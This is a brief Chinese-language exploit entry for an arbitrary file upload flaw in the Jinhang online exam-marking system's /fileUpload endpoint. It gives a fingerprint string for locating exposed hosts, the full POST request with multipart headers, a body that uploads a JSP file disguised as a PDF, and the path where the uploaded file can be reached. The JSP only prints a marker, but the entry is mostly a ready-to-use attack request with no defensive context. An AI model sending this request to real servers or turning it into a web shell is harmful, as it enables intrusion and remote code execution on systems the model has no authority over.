# 金航网上阅卷系统fileUpload任意文件上传漏洞

- **系统**：金航网上阅卷系统fileUpload　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="js/insteadSelect/jquery.insteadSelect.css"`
- **请求**：`POST /fileUpload HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Content-Length: 351`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="upload"; filename="poc.jsp"
Content-Type: application/pdf
<%out.println("1234");%>
--00content0boundary00
Content-Disposition: form-data; name="uploadContentType"
pdf
--00content0boundary00
Content-Disposition: form-data; name="uploadFileName"
1.jsp
--00content0boundary00--
文件路径：/upload/poc.jsp
```
- **预期**：200　|　—